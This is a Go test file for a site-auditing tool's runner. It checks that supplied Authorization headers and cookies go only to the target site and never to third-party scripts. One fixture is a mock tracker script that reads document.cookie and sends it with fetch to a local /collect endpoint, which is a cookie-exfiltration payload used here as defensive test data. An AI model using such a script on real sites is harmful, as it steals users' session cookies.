// Copyright (c) 2026 Rhythm Shahriar <me@rhy.io>
// SPDX-License-Identifier: MIT

package runner

import (
	"context"
	"fmt"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"sync"
	"testing"

	"github.com/RhythmShahriar/soundcheck/browser"
	"github.com/RhythmShahriar/soundcheck/config"
)

// seen records the Authorization and Cookie headers of each request a
// server gets, by path.
type seen struct {
	mu   sync.Mutex
	reqs map[string][2]string
}

func (s *seen) record(r *http.Request) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.reqs == nil {
		s.reqs = map[string][2]string{}
	}
	s.reqs[r.URL.RequestURI()] = [2]string{r.Header.Get("Authorization"), r.Header.Get("Cookie")}
}

func (s *seen) get(path string) ([2]string, bool) {
	s.mu.Lock()
	defer s.mu.Unlock()
	h, ok := s.reqs[path]
	return h, ok
}

func (s *seen) all() map[string][2]string {
	s.mu.Lock()
	defer s.mu.Unlock()
	out := map[string][2]string{}
	for k, v := range s.reqs {
		out[k] = v
	}
	return out
}

// The run's -H headers and --cookie go to the site only: a third-party
// script the page loads gets neither, nor does what that script fetches.
func TestHeadersStayOnSite(t *testing.T) {
	needBrowser(t)
	var site, third seen
	// The third party is reached as localhost, a host of its own: cookies
	// tell hosts apart but not ports.
	tp := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		third.record(r)
		if r.URL.Path == "/tracker.js" {
			w.Header().Set("Content-Type", "text/javascript")
			fmt.Fprintf(w, `fetch('http://%s/collect?c=' + encodeURIComponent(document.cookie), {mode: 'no-cors'});`, r.Host)
		}
	}))
	defer tp.Close()
	tpURL, _ := url.Parse(tp.URL)
	thirdHost := "localhost:" + tpURL.Port()
	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		site.record(r)
		if r.URL.Path != "/" {
			return
		}
		fmt.Fprintf(w, `<!doctype html><title>Staging</title><p>Behind a gate.</p>
<script src="http://%s/tracker.js"></script>
<script>fetch('/api/ping');</script>`, thirdHost)
	})
	srv := httptest.NewServer(mux)
	defer srv.Close()
	cfg := config.Default()
	cfg.Modules, cfg.Viewports, cfg.Rate, cfg.Pages.Limit = []string{"health"}, []string{"desktop"}, 0, 1
	_, err := Run(context.Background(), Options{Config: cfg, Target: srv.URL, Dir: t.TempDir(), Version: "test",
		Headers: map[string]string{"Authorization": "Bearer staging-token", "Cookie": "staging_auth=abc; theme=dark"},
		Browser: browser.Options{NoDownload: true}})
	if err != nil {
		t.Fatal(err)
	}
	for _, path := range []string{"/", "/api/ping"} {
		h, ok := site.get(path)
		if !ok || h[0] != "Bearer staging-token" || !strings.Contains(h[1], "staging_auth=abc") || !strings.Contains(h[1], "theme=dark") {
			t.Errorf("site %s: %q (requests %v)", path, h, site.all())
		}
	}
	// The Go client's requests (robots.txt, sitemaps) carry them too.
	if h, ok := site.get("/robots.txt"); !ok || h[0] != "Bearer staging-token" || h[1] != "staging_auth=abc; theme=dark" {
		t.Errorf("robots.txt: %q", h)
	}
	if _, ok := third.get("/tracker.js"); !ok {
		t.Fatalf("the page didn't load its tracker: %v", third.all())
	}
	for path, h := range third.all() {
		if h != [2]string{} {
			t.Errorf("third party %s got %q", path, h)
		}
		if strings.Contains(path, "staging_auth") {
			t.Errorf("the page's scripts could read the cookie: %s", path)
		}
	}
}

// The Go client adds the headers only to requests to the site.
func TestHeaderTransportScope(t *testing.T) {
	var got seen
	h := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { got.record(r) })
	srv, other := httptest.NewServer(h), httptest.NewServer(h)
	defer srv.Close()
	defer other.Close()
	site, _ := url.Parse(srv.URL)
	c := httpClient(Options{Headers: map[string]string{"Authorization": "Bearer t", "Cookie": "a=1"}}, site)
	for _, raw := range []string{srv.URL + "/mine", other.URL + "/theirs"} {
		resp, err := c.Get(raw)
		if err != nil {
			t.Fatal(err)
		}
		_ = resp.Body.Close()
	}
	if h, _ := got.get("/mine"); h != [2]string{"Bearer t", "a=1"} {
		t.Errorf("site: %q", h)
	}
	if h, _ := got.get("/theirs"); h != [2]string{} {
		t.Errorf("another port: %q", h)
	}
}
